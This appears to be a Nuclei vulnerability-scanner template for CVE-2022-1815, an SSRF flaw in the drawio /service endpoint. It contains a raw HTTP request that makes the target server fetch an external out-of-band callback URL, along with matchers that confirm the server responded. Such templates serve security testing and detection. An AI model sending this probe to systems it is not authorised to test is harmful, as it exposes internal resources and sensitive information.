id: CVE-2022-1815

info:
  name: jgraph/drawio - Server Side Request Forgery
  author: amit-jd
  severity: medium
  description: |
    SSRF in /service endpoint in jgraph/drawio pripr to 18.1.2. Exposure of Sensitive Information to an Unauthorized Actor in GitHub repository jgraph/drawio prior to 18.1.2.
  reference:
    - https://huntr.dev/bounties/6e856a25-9117-47c6-9375-52f78876902f/
    - https://nvd.nist.gov/vuln/detail/CVE-2022-1815
  tags: cve,cve2022,drawio,ssrf

requests:
  - raw:
      - |
        GET /service/0/{{interactsh-url}} HTTP/2
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: regex
        regex:
          - "<html><head></head><body>(.*)</body></html>"
